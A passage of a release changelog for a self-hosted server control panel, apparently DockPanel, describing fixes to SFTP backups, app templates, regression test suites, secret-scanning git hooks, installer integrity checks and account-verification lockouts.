+Redis: given `server` it runs happily and retries the database for ever, turning
+today's loud failure into a container that reports healthy and never serves. vLLM
+takes its model as a command-line argument, which the override table cannot
+interpolate. SurrealDB needs a datastore path *and* a writable volume — it runs
+as `nonroot` while volume directories are created root-owned, so it cannot write
+`/data`, and without the path it silently keeps everything in memory and loses it
+on restart.
+
+### Added — a regression pin over the catalogue's image references
+
+`tests/app-template-images-pin-e2e.sh`, 13 assertions, red against the previous
+release. It pins the specific references measured dead so none can return by a
+revert or a copy-paste, and pins each replacement *positively* so a silent
+downgrade fails loudly too. It deliberately does **not** ban bare-major tags:
+`mongo:7`, `mysql:8` and `postgres:16-alpine` are bare-major pins that resolve
+perfectly well, and a screen that flags most of its population is a fact about
+the screen. Whether a tag still resolves *today* is a claim about the world rather
+than about a commit, so it belongs to the daily live-surfaces check instead.
+
+Assertions 1813 → 1826.
+
+## [2.95.2]
+
+### Fixed — v2.95.1 shipped with its own SFTP transport reverted, breaking every SFTP upload
+
+**Upgrade immediately if you are on v2.95.1**, and note that the damage is wider
+than the bug it was meant to fix: in v2.95.1 both SFTP operations call `ssh` with
+sftp's batch arguments, which fails on **every** destination, not only the
+`ForceCommand internal-sftp` ones #102 was about. v2.95.0 and earlier are
+unaffected — they work everywhere except behind `ForceCommand`.
+
+The revert was a leftover mutation from testing v2.95.1's own fix, and three
+separate checks failed to catch it in the same reassuring direction:
+
+- The "known-good" copy used to restore the tree after the mutation test had been
+  taken **after** the mutation was applied, so it preserved the defect.
+- The verification grep, `run_sftp("ssh"`, matched nothing — because rustfmt wraps
+  that call across lines, and grep matches within a single line. Zero hits read as
+  "clean" when it meant "this pattern cannot match this formatting".
+- The regression arm carried the **identical** blindness. It went red against the
+  pre-fix source, whose call was on one line, and stayed green over the reverted
+  transport. A pin proven against one formatting is not proven against the other.
+
+The end-to-end test that would have caught it skips silently when its lab server
+is not configured, so a green run and a run that never executed look the same.
+
+Both arms now flatten the function body before matching, so a wrapped call is
+still seen, and each was mutation-tested against **both** the single-line and the
+multi-line spelling. A second arm asserts the transport is named positively —
+`run_sftp` with `sftp` — rather than only asserting `ssh` is absent, so a call to
+some third thing cannot pass by being neither. Assertions 1801 → 1803.
+
+### Corrected — MinIO was not the only app template that cannot start
+
+v2.95.1 said MinIO was "the only template in the catalogue of 153 that needs an
+override". That was wrong, and a catalogue audit found at least seven more whose
+image cannot come up as shipped — verified from each image's own config:
+
+- **`cloudflared`** — default `Cmd` is literally `["version"]`. It prints a version
+  string and exits, every deploy. The template collects a `TUNNEL_TOKEN` as a
+  required secret and has no way to use it.
+- **`ntfy`**, **`trivy`**, **`surrealdb`** — multi-command CLI entrypoints with a
+  null `Cmd`, so a bare run prints help and exits. They need `serve`,
+  `server --listen …` and `start` respectively.
+- **`keycloak`**, **`authentik`**, **`vllm`** — same class. `keycloak`'s own
+  template description already said it *"Requires 'start-dev' command override"*,
+  written against a struct that had no field capable of expressing one.
+
+None of these is fixed here. Each needs its arguments established by running the
+image, the way MinIO's were, rather than guessed from documentation — and
+`cloudflared` needs a way to reach an env var that today goes nowhere. The
+override mechanism this release ships is what they will use. Tracked as unbuilt.
+
+## [2.95.1]
+
+### Fixed — no SFTP backup could reach an SFTP-only server, and MinIO never started (#102, #101)
+
+Both reported by @munoz-dev, both with a source-level root cause, and both
+reproduced here before anything was changed.
+
+**#102 — SFTP destinations behind `ForceCommand internal-sftp`.** That directive is
+OpenSSH's own documented way to run a chrooted, SFTP-only account, and it replaces
+whatever command an exec request carried with the SFTP subsystem. Both SFTP
+operations *were* exec requests: `ssh host "mkdir -p …"` to create the directory,
+then `scp` to transfer. The mkdir was discarded, so Test Connection failed and no
+real upload could complete either.
+
+Both now drive the SFTP subsystem in one batch session. Three things that fix
+turned up, none of them visible from the report:
+
+- **`scp` had to go, not merely move.** OpenSSH 9.0 switched scp to the SFTP
+  protocol, so an agent on a current distro transfers fine and only the mkdir
+  fails — while an agent on RHEL 8 or Ubuntu 20.04 still speaks legacy `scp -t`,
+  which is an exec request and would have kept failing after a mkdir-only fix.
+  Measured against a chrooted sshd: default scp exit 0, `scp -O` exit 1.
+- **`sftp -b` sets `BatchMode` by itself**, and BatchMode disables the password
+  auth `sshpass` exists to answer. The password branch now says `BatchMode=no`
+  out loud; without it every password-authenticated destination would have died at
+  `Permission denied` — the v2.88-era defect, arriving through the flag instead.
+- **Paths are quoted for sftp's parser, which is not a shell.** An unquoted
+  `put local /backups/my dir/f.tgz` does not fail: it writes to `/backups/my`
+  under the *source* filename and exits 0. A remote path carrying a newline is now
+  refused outright, because in a batch script a newline starts a new command.
+
+The error an operator sees is fixed too. `internal-sftp` refuses on **stdout**,
+and the agent built its message from stderr alone — so a failed backup was
+reported as `Warning: Permanently added '[host]:port' … to the list of known
+hosts.`, and on any later connection, with the key already pinned, as `no error
+output from ssh`. Both streams are now reported.
+
+**#101 — the MinIO app template crash-looped on every deploy.** `minio/minio`'s
+default `CMD` is `["minio"]`, which prints usage and **exits 0**. Nothing crashed:
+the container simply had no supervised process, so `unless-stopped` restarted it
+forever at `ExitCode: 0`. Verified against the image — without startup arguments
+it reached `restarting` with 7 restarts; with them it runs at 0 restarts and
+answers on both the S3 port and the console. The template now supplies
+`server /data --console-address ":9001"`, `/data` being the path it already
+mounts a volume at, so the served directory and the persisted one are the same.
+It is the only template in the catalogue of 153 that needs an override, and that
+list is keyed by template id rather than added as a field to all 153 declarations.
+
+**Assertions 1788 → 1801.** `backup-lands` gained the transport invariants — that
+neither operation issues an exec request, that both quote their paths and refuse a
+line break, that scp stays gone, and that both report both output streams — each
+one confirmed red against the pre-fix source. The MinIO fix is guarded by unit
+tests asserting the override exists, that the served path is one the template
+persists, and that no other template silently acquired one.
+
+### Fixed — six pins were being held green by a comment, and one of them guarded session revocation
+
+v2.95.0 fixed one suite whose arms could be satisfied by prose. This measures the
+rest of the family instead of arguing about it: all 115 findings from that census
+were executed in a sandbox — plant the mutation, assert it landed, re-run the
+suite ANSI-stripped, compare exit code and marks and totals against a baseline.
+
+**98 of 115 survived.** 95 carry an executed control proving the comment text is
+the sole cause of the green. Six needed no planted prose at all, because a comment
+already shipping in the tree satisfied them:
+
+| pin | fed by | what could be removed unnoticed |
+|---|---|---|
+| `auth-doors` — panic writes the session-revocation watermark | `security.rs:742` | the entire revocation leg: the settings write **and** the cache update |
+| `auth-doors` — `ws_metrics` enforces revocation on its own decode path | a planted `//` | the whole revocation block |
+| `ssl-correctness` — the pre-push hook uses the same gate CI does | `pre-push:180` | the audit gate invocation |
+| `update-rollback` — `update.sh` does not `--wait` on its own unit | `update.sh:43` | the entire `exec systemd-run` re-exec |
+| `update-rollback` — a zero exit is a handoff, not a success | `panel_update.rs:442` | the verdict-file watch loop |
+| `rpm-install` — `setup.sh` sets `httpd_can_network_connect` | `setup.sh:383` | the SELinux boolean, so the panel answers 502 on Enforcing |
+
+The first is the one that matters: the panic button could stop revoking sessions
+entirely and the pin that exists to prevent exactly that stayed green.
+
+Six suites now carry the language-aware stripper proven in v2.95.0 — hoisted
+**above** every call site, because `ssl-correctness` had its own stripper at line
+301 with 18 raw arms above it and `rpm-install` one at line 428 with 15 above.
+Bodies are stripped *before* they are sliced; the stripper blanks rather than
+deletes, so line numbers stay true. Prose subjects (a guide, a lockfile, a
+manifest) are still read raw, deliberately and marked.
+
+**Assertions 1604 → 1788.** Each suite gained hermetic stripper fixtures, an
+encoded mutation asserting every pinned pattern is live in code and then
+commenting it out, a structural arm refusing any future arm that reads a subject
+raw, and — because stripping makes a check see *less* — one planted real defect
+per polarity. Negative arms fail in the quiet direction, so they cannot be covered
+by the same control as positive ones.
+
+### Fixed — nine pins could be turned red by a comment alone
+
+The same blindness runs the other way. On a negative arm (match ⇒ bad) prose that
+merely *names* the forbidden shape trips the grep, so a comment could fail the
+suite on correct code. Nine arms across `ssl-correctness`, `nginx-listen`,
+`auth-doors`, `cpu-metric`, `install-integrity`, `wrong-host-dispatch`,
+`site-transfer-visibility` and `unattended-host-scope` did this. Stripping fixes
+both polarities at once.
+
+### Fixed — a structural guard that a path could walk past
+
+The new raw-read guards matched a subject written as `"$VAR"` but not as
+`"$VAR/file"`, and their subject lists omitted the directory variables, so a
+future arm written in path form was invisible to three of them. Both idioms are
+now unioned and the lists cover the directory vars; each guard is mutation-tested
+in both forms. `access-recovery`'s one legitimate raw read — a file *discovery*
+grep whose every hit is re-read through a stripping helper — is now marked, and
+the number of such marks is itself pinned so the escape hatch cannot widen
+silently.
+
+Also: the comment-out helper in four suites keyed its hit list on `NR == FNR`,
+which breaks on an empty hit list — the whole subject is consumed as hit numbers
+and the empty result reads as "the stripper is not reaching this subject" when the
+truth is "this pattern has no code left to comment out". Keyed on `FILENAME` now.
+
+## [2.95.0] - 2026-08-09
+
+A release about the web terminal, and about a suite that was reading prose.
+
+### Fixed — the terminal's most-used colour was unreadable, and one was invisible
+
+The three palettes are faithful transcriptions of Catppuccin Mocha, Dracula and
+Atom One Light, and they are not the problem. The problem is what xterm was never
+told.
+
+`brightBlack` — git hashes, systemd timestamps, most secondary CLI output —
+measured **2.46:1** on mocha and **3.03:1** on dracula against their own
+backgrounds. Both fail AA; mocha fails even the 3:1 large-text floor, and SGR dim
+(`\e[2m`) halves each again to 1.54:1 and 1.74:1. Rather than edit three upstream
+palettes, the terminal now passes `minimumContrastRatio: 4.5` and xterm lifts any
+failing foreground at render time, for every theme at once.
+
+The light theme's `brightWhite` was `#fafafa` — byte-identical to its own
+background, so `\e[97m` text was invisible at exactly **1.00:1**. Eight of its
+sixteen slots failed AA, including the three colours this page writes itself: its
+own connection status, warnings and errors were below contrast in its own theme.
+
+`cursorAccent` was unset in all three, so the glyph under a block cursor fell back
+to `#000000` — a black character inside the light theme's blue cursor.
+`selectionInactiveBackground` was unset, so focused and unfocused selection looked
+identical, and the auto-derived scrollbar slider measured 1.42:1 on light.
+
+### Fixed — the terminal only noticed WINDOW resizes
+
+Resize handling was a bare `window` listener, which misses every way this
+terminal actually changes size. The sidebar expands **on hover** and stays in
+flow, so pointing at the nav swings the terminal's width by 160px with no window
+event; the same happens vertically whenever Snippets, SSH Info, either banner or
+the mobile toolbar appears. The PTY kept the stale `cols`/`rows`, so wrapped
+output tore and `top`, `tmux`, `nano` and `htop` stayed corrupt until the browser
+window itself was resized. Now a `ResizeObserver` on the container, coalesced per
+frame and guarded against fitting a collapsed box.
+
+### Fixed — smaller terminal defects, all of them options never passed
+
+- **Scrollback was xterm's default 1000 lines.** `journalctl -n 2000` silently
+  lost its top — and Copy Output and Share iterate that same buffer, so a shared
+  link was truncated without saying so. Now 10000.
+- **No focus indicator existed at all.** xterm sets `.xterm:focus{outline:none}`
+  and the element that takes focus is an off-screen textarea, so the panel's
+  global focus ring had nothing to land on and nothing signalled whether
+  keystrokes would reach the shell. The wrapper now carries a `focus-within` ring.
+- **Find had no decorations**, so a match was merely selected — in the same
+  low-alpha grey as any selection, about a 1.8:1 shift. Matches are now
+  highlighted in colours derived from the active theme.
+- The **notice banner** used stock `amber-*` instead of the panel's per-theme
+  `warn-*` tokens and measured **1.19:1** on the light panel themes — invisible,
+  and it is exactly what an owner with no site assigned sees.
+- The terminal's **font stack** had drifted from `--font-mono`, so a box without
+  the webfont rendered the terminal and its chrome in different faces; `fit()`
+  also ran before `document.fonts.ready`, which on a cold load could measure the
+  fallback face and produce a grid with the wrong column count.
+- The theme map was typed `Record<string, string>`, so a key xterm does not
+  recognise compiled clean and did nothing — which is how the missing keys above
+  went unnoticed. It is now `ITheme`.
+
+Not changed, deliberately: `selectionForeground` stays unset. Setting it would
+guarantee selection contrast but flatten all selected text to one colour, and
+that is a design decision rather than a defect. Three xterm addons that would
+help — WebGL (which also carries the programmatic box-drawing glyphs the DOM
+renderer lacks), web-links and unicode11 — are new dependencies and are not in
+this release.
+
+### Fixed — a regression pin that a comment could satisfy
+
+`tests/sandbox-paths-pin-e2e.sh` is the suite holding all five install paths
+together. Sections 7 and 8 had read comment-stripped source since s275; sections
+1 to 6 did not. The strippers were defined at line 379, inside section 7, and
+every call site sat below the definition — so thirty-odd arms above it were
+greping raw files, and a comment carrying the text an arm searched for satisfied
+that arm while the code it named was gone.
+
+Measured by mutation rather than argued: **23 of the suite's 64 assertions could
+be satisfied by a comment, with the suite still reporting `passed: 64 failed: 0`.**
+Replaying the s271 defect in its exact shape — delete `install-agent.sh`'s
+`--print-unit` call, leave the explanatory comment, write a unit body with a
+tab-indented heredoc — kept all five guarding arms green, because four were
+reading the comment and the fifth was anchored at column 0. The three arms that
+compare `grep -n` line numbers failed worse still: moving update.sh's mkdir loop
+below the unit install kept the arm green *and* made it print the comment's line
+number as its evidence.
+
+The strippers now sit above section 1, dispatch on the subject's language rather
+than assuming `#`, and blank comment lines instead of deleting them, because
+deleting renumbers the file the ordering arms measure. Also closed: the
+`^\[Service\]` anchor an indented heredoc slid under, and a discovery floor of 4
+that had been left behind while five copies existed — one copy could leave the
+population and the suite reported `passed: 62 failed: 0`.
+
+Three new sections hold it: the strippers get hermetic fixtures, every pinned
+pattern is asserted to be live code and re-checked by commenting it out on each
+run, and a structural arm refuses any future arm that reads a subject raw. The
+suite goes from 64 assertions to 94.
+
+### Fixed — the leak scan's summary contradicted its own warning
+
+Committing the change above made `scripts/hooks/pre-commit` print
+`WARNING: Internal hostname found in staged changes` in red, and then
+`Clean — no infrastructure leaks detected.` in green, and exit 0. The hostname arm
+is deliberately non-blocking — these names appear in docs and examples
+legitimately — but the closing verdict was unconditional, so a run that had just
+reported a hit still signed off as clean, and the green line is the one an
+operator reads. The warning was also printed in the same red as a genuine BLOCK,
+which teaches you to read past both. It is now yellow, and the summary describes
+the run it belongs to. Nothing is blocked that was not blocked before.
+
+Two arms added to `install-integrity-pin-e2e.sh` (28 → 30), the second a
+must-not-fire: a genuinely clean scan must still say so, or the fix would be
+satisfied by a hook that never claims cleanliness at all.
+
+Published assertion total moves 1572 → 1604 across the three surfaces that carry
+it. No production code changed.
+
+## [2.94.0] - 2026-08-09
+
+A release about guards that were not guarding. Two of them decide what gets
+installed on a machine; two decide what leaves this repository. All four reported
+success in the cases they existed to catch.
+
+### Fixed — a commit could carry a secret past both hooks by arriving alone
+
+`scripts/hooks/pre-commit` narrowed the staged file list to eleven source
+extensions before scanning anything. When a commit consisted only of other file
+types the list came back empty, and the hook printed a green *"No scannable files
+staged"* and exited 0 — while the `.env`/`.pem`/`.key` filename check, which never
+needed that list, sat **below** the exit. `scripts/hooks/pre-push` had the same
+inversion: an empty pathspec'd diff hit a `continue` that abandoned the rest of the
+loop, including its own filename check.
+
+The control is what makes it undeniable: a commit of one `.pem` holding a GitHub
+token plus an nginx `.conf` holding a real origin address **committed clean and
+pushed green**. The same `.pem` with any `.rs` file riding along was blocked. Same
+secret, opposite verdict, decided entirely by whether an unrelated file came along.
+
+Both filename checks now run first. The content scan no longer narrows by
+extension at all — an extension allowlist is a rule that reports clean right up
+until the leak arrives in a file type nobody listed, and the seven tracked `.conf`
+files (two of them production vhosts), the agent's systemd unit and four
+Dockerfiles were all outside it. Patterns are now written so the hooks do not match
+their own source, which is what lets the scan cover every file with no exemption.
+
+Two further holes closed in `pre-push`: its new-branch arm ran `git diff <sha>`,
+which compares that commit against the *working tree* and is empty on a clean tree,
+so the branch whose comment read "scan all commits" scanned nothing; and it
+discarded git's stderr, so a range it could not resolve was indistinguishable from
+a clean push. It now asks for the commits, and fails closed when it cannot.
+
+### Fixed — the demo deploy proved one binary of three was static, and believed a broken checker
+
+`scripts/deploy-demo.sh` refuses a dynamically-linked asset because a stale glibc
+build once reached the demo box. It ran that check on the **API** asset only, while
+installing the agent and the CLI unchecked — and the agent is the binary that
+incident was actually about.
+
+The same check also read any `readelf` failure as proof of static linkage. The
+mechanism generalises: the check ended in a grep, and under `pipefail` a pipeline
+keeps the *rightmost* non-zero status, so `readelf`'s 127 was overwritten by grep's
+no-match 1. Measured — a non-ELF file, a zero-byte download, and a genuinely
+dynamic binary with `readelf` absent all printed *"confirmed: no DT_NEEDED
+(static)"*.
+
+The assets are now named once and the download, checksum, linkage and swap steps
+all iterate that one list, so a fourth asset cannot be added and skip a check.
+
+### Added — the demo deploy verifies what it downloaded, and asserts what it deployed
+
+`deploy-demo.sh` was the only path consuming a published release that compared
+nothing to the release's `checksums.txt`; `setup.sh`, `update.sh` and
+`agent-self-update.sh` have always done so. It now verifies every asset and fails
+closed.
+
+Its AFTER block also only ever *reported*. The health loop fell out silently after
+40 seconds, the public curl had no `-f` so a 502 printed as an empty string, and
+nothing compared any version read to the tag being deployed — so a run that left
+the API dead still exited 0. Every probe is now asserted, including the agent's own
+socket, and a version mismatch fails the deploy.
+
+### Added — the remote agent installer verifies the binary before installing it
+
+`scripts/install-agent.sh` — the installer the Add-Server dialog tells an operator
+to pipe into `sudo bash` — had no integrity check of any kind, and wrote the
+downloaded bytes straight onto `/usr/local/bin/dockpanel-agent`. It now downloads
+to a quarantine path, verifies sha256 against the release's `checksums.txt`
+(mismatch fatal, missing manifest warns, matching `setup.sh`'s fresh-install
+policy), and only then renames onto the live path. That also fixes a re-run on a
+box where the agent is already running, which previously failed with a busy file
+and reported it as a network error.
+
+### Tests
+
+New `tests/install-integrity-pin-e2e.sh`, 27 assertions, red at v2.93.0 on 13 of
+them. It *executes* the guards rather than reading them: the linkage guard is run
+against a stubbed `readelf` through five cases, and the hooks are run against
+throwaway git repositories — including must-not-fire cases, because a gate that
+blocks everything is not a working gate.
+
+## [2.93.0] - 2026-08-09
+
+A test-and-tooling release. Nothing an operator uses changes; what changes is
+whether the checks that guard the rest of it can be believed.
+
+### Fixed — a successful match could be reported as a failure
+
+Throughout the test suites, the release scripts and the git hooks, a common shell
+idiom asked a yes/no question by piping output into a grep that stops at its first
+match. Under `set -o pipefail` that idiom can return the wrong answer. The grep
+exits as soon as it matches; the command upstream is still writing; it is killed by
+`SIGPIPE` and exits 141; and `pipefail` reports that as the status of the whole
+pipeline. **A match that succeeded is reported as no match.**
+
+This was recorded a release ago as a rare race — measured then at two occurrences in
+four hundred runs, which is why it first appeared as a test failure that would not
+reproduce. That characterisation was too kind. The race exists only while the
+upstream command's output fits the 64 KiB pipe buffer; above that it is still
+writing by definition, and the wrong answer becomes **certain**. Measured here: on a
+2.2 MB input in which every line matched, 400 of 400 runs reported no match.
+
+Which branch that wrong answer takes decides how much it costs. A check that fails
+when it *cannot* find something turns falsely red, and announces itself. A check
+that fails when it *does* find something turns falsely green — and a green check is
+what success looks like. The git hooks are in the second category: they scan the
+diff being pushed for credentials and internal addresses, and their input is the
+largest of any such pipeline in the repository.
+
+All 105 occurrences are converted to a form that reads its input to the end, so the
+upstream command is never signalled and the exit status still answers the same
+question. No check changes what it looks for.
+
+A new regression pin (`pipefail-sigpipe-pin-e2e.sh`) enumerates every shell script
+and workflow in the repository from the tree itself and fails if the idiom returns.
+It deliberately does not exempt files that lack `pipefail` today: two of the sites
+found were in files that would have been exempt, including the hooks above, and a
+rule that depends on a shell option somebody may add later reports "clean" right up
+until it matters.
+
+### Fixed — the arm64 and container CLI probes in the release smoke test had no timeout
+
+Two of the six per-distro probes invoked the CLI without the `timeout` wrapper their
+sibling probes use. Previously the pipeline killed a hung process as a side effect of
+the defect above; with that removed, the guard is now explicit.
+
+## [2.92.0] - 2026-08-09
+
+Two features that were advertised and did not work: one that had never worked on any
+install since it shipped, and one that worked but buried its own output.
+
+### Fixed — the WHMCS integration could never be configured, on any install
+
+Saving the WHMCS settings answered *"Failed"* and always had. The single statement
+that writes the configuration is an upsert whose conflict target is a constant
+expression, and no unique constraint on the table ever matched it. PostgreSQL
+resolves that target when it *parses* the statement, not when a row conflicts — so
+the save failed on the very first attempt as well as on re-saves, and the table
+could never hold a row at all.
+
+Everything downstream was therefore unreachable rather than broken: the settings
+screen reported the integration unconfigured, and the webhook answered *"WHMCS not
+configured"* before it read a secret. The billing integration the manifest
+advertises has been inert since it was introduced on 2026-03-28.
+
+A migration adds the constraint the statement always assumed it had, which admits
+exactly one configuration row — the behaviour the code was written for.
+
+Three defects underneath it, none previously reachable to observe:
+
+- The webhook secret was **generated fresh on every save and never stored** by the
+  update path, so the panel would have shown a secret the database did not hold, and
+  each save would have invalidated the hook already configured in WHMCS. It is now
+  minted only when none exists and preserved thereafter.
+- The **hook URL the panel prints does not work**: it carries the secret as a query
+  parameter, and the handler read it only from the JSON body, so the address an
+  operator was told to paste into WHMCS answered 401. The handler now accepts
+  either, body first.
+- Reading the current settings **fell back to defaults when the database could not
+  be reached**, which would silently re-enable billing-driven suspension for an
+  operator who had turned it off. It now reports the failure.
+
+The webhook's authentication is unchanged: the secret is still compared in constant
+time and an unconfigured panel still refuses hooks.
+
+### Fixed — System Logs was 99.98% storage samples, and the filter omitted the cause
+
+A background task records total backup bytes once a minute by inserting a row into
+the system log. It is a metric with a real consumer — the 30-day storage series on
+the Backup Manager — but it is not an event anyone reads, and on this panel it
+outnumbered genuine entries **43,272 to 10**. At the page's 50-row window that put
+every real entry older than roughly fifty minutes below the fold, permanently.
+
+The source dropdown built to filter exactly this listed seven sources; ten are
+written. The three it omitted included the one responsible for almost the entire
+table, and there was no way to exclude a source — so the noise could be neither
+selected nor suppressed.
+
+The default listing now hides those metric rows and the tiles count the same
+population the list shows, while the source stays selectable, so nothing became
+unreachable. The dropdown now offers every source the backend actually writes.
+
+Three further defects on the same screen:
+
+- **An unrecognised level or time range returned the unfiltered list.** It did not
+  error and did not return an empty set, so a typo silently widened the answer while
+  looking like a filter that had matched a great many rows. Both are now refused.
+- **A database failure rendered as an empty log** — the one page an operator opens
+  to find out what went wrong could not distinguish *"nothing happened"* from *"we
+  could not read it"*. Both endpoints now report the failure.
+- **Two writers spelled the warning level in a form no reader accepts**, so those
+  entries were missing from the Warnings tile, unreachable through the level filter,
+  and rendered as an unknown level. The writers are corrected and a migration
+  normalises the rows they already wrote.
+
+### Changed
+
+- Documentation corrected: the mail module's administrator-only handler count was
+  published as "42 of 42", a figure obtained by counting occurrences of the
+  extractor rather than handlers. It has been 41 at every tag since 2.83.0.
+
+## [2.91.0] - 2026-08-09
+
+The same lockout as 2.90.0, in the two account-creation doors that release did not
+reach — plus a third door that let new accounts past a gate an operator had switched
+on, and an audit-log promise the code never kept.
+
+### Fixed — accounts created by an administrator or a reseller could never sign in
+
+2.90.0 fixed this for the very first administrator (#100). It did not fix it for
+anyone created afterwards.
+
+**Users → Add User** and the reseller's **Create User** both wrote the account
+without marking it verified and without issuing a verification token. That is the
+same pair 2.90.0's own migration defines as *"can never verify"*: sign-in refuses an
+unverified account whenever an SMTP host is merely set, the verification route
+matches on a token these accounts do not have, and password reset needs the
+forgot-password message. Any panel with email configured therefore handed out
+accounts that could not be used and could not be repaired by the person holding
+them.
+
+The admin door closed the trap on itself — it sends a welcome message over the same
+SMTP whose presence arms the block, and that message says *"please log in"* while
+carrying no verification link. The reseller door was worse: it sends no mail at all,
+and the override added in 2.90.0 requires an administrator, so a reseller could not
+release the client they had just created.
+
+Both doors now mark the account verified, which is the trade the OAuth and WHMCS
+doors already make: the address is asserted by the person creating the account
+rather than proven by the person receiving it. Self-service registration is
+unchanged — it still issues a token and still requires the recipient to confirm.
+
+**Why 2.90.0 missed it:** the check that convinced us the other doors were fine
+searched for the column by name. That is blind to a statement which omits the
+column, and the two doors still broken were exactly the two files that never
+mentioned it. The regression suite now enumerates *every* statement that creates an
+account and asks each one, rather than trusting a name search.
+
+### Fixed — OAuth sign-ups ignored Registration Approval Mode
+
+With **Registration Approval Mode** on, a new account created through an OAuth
+provider was admitted immediately. The account was written without the approval
+column, so it fell to that column's default of approved, and it never appeared in
+**Security → Approvals** because that list shows only unapproved accounts. An
+operator who switched the setting on got it applied to password registration and
+nowhere else, with nothing to indicate the other way in was open.
+
+The OAuth sign-in path also never checked approval at all, unlike the password and
+passkey paths. Both are fixed. Accounts that predate the approval column continue to
+read as approved, so no one who could sign in yesterday is locked out today.
+
+### Fixed — the audit log promised on-disk tamper-proofing that nothing provided
+
+The hardening guide stated that security events are written to *"append-only files
+on disk"*. Nothing in DockPanel ever made them append-only: the only code that set
+the attribute lived in a route with no caller anywhere, and it set it on the audit
+**directory** rather than on the files.
+
+That placement does not do what it appears to. On a directory the attribute prevents
+deleting and renaming the logs while still allowing any of them to be opened and
+rewritten in place — so the tampering the guide claimed was prevented was not, and
+the protection it did add would have silently stopped the panel's own 365-day
+retention sweep, which cannot unlink under it even as root.
+
+- The uncalled route is removed. Every directory it created is already created on
+  demand by the code that needs it.
+- The retention sweep no longer discards the result of a failed delete; it names the
+  files it could not remove and the likely cause. It also falls back to modification
+  time on filesystems that do not record creation time, where it previously swept
+  nothing at all.
+- The guide now states what is actually enforced — the database trigger that rejects
+  UPDATE and DELETE — describes the on-disk copies as a convenience, and documents
+  how an operator can apply kernel-enforced protection to the **files** if they want
+  it, including the caveats.
+- The end-to-end suite no longer asserts the misplaced attribute. That assertion
+  could only ever pass on a machine where somebody had run `chattr` by hand.
+
+### Changed — canary monitoring reports partial coverage
+
+Two of the four canary paths are inside directories that the panel's own systemd
+sandbox replaces with an empty mount, so this process cannot observe them whatever
+is on disk — and they report as *absent* rather than as *unreadable*, which is why
+2.90.0's "absent versus unreadable" distinction never applied to them. Monitoring
+now says how many paths it is actually watching, names the ones it cannot watch, and
+no longer advises creating files that would still not be seen.
+
+## [2.90.0] - 2026-08-09
+
+Three security controls that reported a state they had never established, and one
+of them had already locked a real operator out of his own panel.
+
+### Fixed — configuring email could lock the first administrator out permanently
+
+Reported as #100. The initial setup screen created the first administrator with
+only an address, a password hash and a role, so the account was stored
+**unverified** — and because it never registered, it never held a verification
+token either.
+
+Sign-in refuses an unverified account whenever an SMTP host is set. The check is
+on that setting being **present**, not on the mail working. So the gate armed the
+moment the operator configured email, against their own account, and every exit
+required the mail being configured: the verification route matches on a token
+this account does not have, so the link could not be resent because it could not
+exist; and the password-reset route needs the forgot-password message. The
+reporter reinstalled to get back in.
+
+Four parts, because fixing the writer does not reach installs that already hold
+the broken row:
+
+- The setup screen now marks the administrator it creates as verified. It issues
+  no token and sends no mail, so there was never a ceremony to complete — the
+  registration door, which does send mail, has always set both columns.
+- A migration releases existing accounts that are unverified **and** hold no
+  token, which is exactly the set that can never verify. Accounts with a live
+  verification link outstanding are deliberately left alone.
+- **Security → Approvals** gains *Accounts blocked by email verification*, with a
+  **Mark verified** button. Rows are labelled `no link exists` or
+  `link outstanding` so an administrator can see which accounts are beyond
+  self-rescue. This is the button the reporter asked for.
+- The hardening guide now documents the symptom, the cause and two recoveries.
+  It previously documented neither this lockout nor the column.
+
+### Removed — a second IP whitelist that never restricted anything
+
+The **Panel IP Whitelist** card wrote a file on the agent host and read it back
+to display it. Those two functions were the only references to that path in the
+repository: no nginx include, no template, nothing compiled into either binary.
+It had been inert since 2026-03-15, while telling the operator "Whitelist saved
+(N IPs)" and writing an audit-log entry for a change that had no effect.
+
+DockPanel's real IP restriction arrived a week later and is unaffected: **Panel
+IP Allowlist**, in Settings → Account → Security Hardening, enforced at every
+door that mints a session, CIDR-aware, validated on save, and documented with a
+recovery path. It is now the only such control in the panel.
+
+The inert card sat *above* the working one on the same tab, so an operator
+restricting panel access could reasonably have used the wrong one. A stale
+`.conf` file may remain on upgraded systems; it is inert and always was.
+
+### Fixed — canary file monitoring reported "armed" while watching nothing
+
+The intrusion-detection tripwire is on by default, but nothing in the product
+ever creates the canary files, and the checker took the same silent path for "no
+canary was ever created" as for "a canary exists and cannot be read". A tripwire
+with nothing on the wire was indistinguishable from a quiet one.
+
+The check now separates the two, warns when a canary exists but is unreadable
+(two of the four paths are unreadable on a stock install because the service runs
+under `ProtectHome=yes`), and says once, at warning level, when nothing at all
+could be examined — instead of reporting silence as safety. Arming the tripwire
+automatically is not part of this release.
+
+### Added
+
+- `tests/access-recovery-pin-e2e.sh` — 12 assertions covering all three fixes.
+  Ten are red at v2.90.0's predecessor; the other two are controls asserting that
+  the verification gate was repaired rather than deleted, and that the surviving
+  IP allowlist still guards every session-minting door.
+
+## [2.89.0] - 2026-08-09
+
+Four fixes with one shape: a fix from the previous release whose reach fell
+short of what it claimed.
+
+### Fixed — v2.88.0's own backup hardening could break the panel it upgraded
+
+To keep the pre-upgrade dump root-only, v2.88.0 set `umask 077` in `update.sh`.
+It set it at **top-level scope**, in an 1100-line script, so it governed every
+directory and file the rest of the upgrade created — roughly 840 lines of it.
+
+Two of those directories have a non-root reader. `/opt/dockpanel/frontend` is
+where nginx serves the panel's own interface from, as `www-data`; created `0700`
+it cannot be traversed, so **every panel asset returns 403**. And
+`/var/www/acme/.well-known/acme-challenge` is where HTTP-01 challenges are
+written, so **certificate renewal fails**. Both failures are quiet: `tar`
+restores the modes recorded in the archive, so the extracted tree looks correct
+and only its parent is wrong.
+
+This does not affect an install whose directories already exist — `mkdir -p`
+does not change an existing mode — which is why it was invisible on boxes that
+had simply been upgraded before. It fires where the upgrade creates them fresh,
+most notably the migration from the source layout to the release layout.
+
+The umask now applies to the dump's own subshell, matching the form `setup.sh`
+already uses. The dump is still written `0600`, verified in both directions.
+
+### Fixed — the daily backup cron was never repaired on an existing install
+
+v2.88.0 hardened the backup script `setup.sh` **writes**, but an install created
+before it keeps the dump as an *inline* crontab command whose bare `>` produces
+`0644`. Nothing rewrote it: `update.sh` did not reference `crontab` at all, and
+`setup.sh` de-duplicated on the new script's path, which an inline line never
+contains — so re-running setup left the old entry in place and added a second
+daily dump of the same database.
+
+Upgrading now rewrites that entry to run under `umask 077`, preserving whatever
+schedule the operator chose, and `setup.sh` recognises and replaces the inline
+form instead of duplicating it. Until this release, the newest dump on such a
+box was world-readable in mode from 03:30 until the agent next restarted and
+re-secured the tree.
+
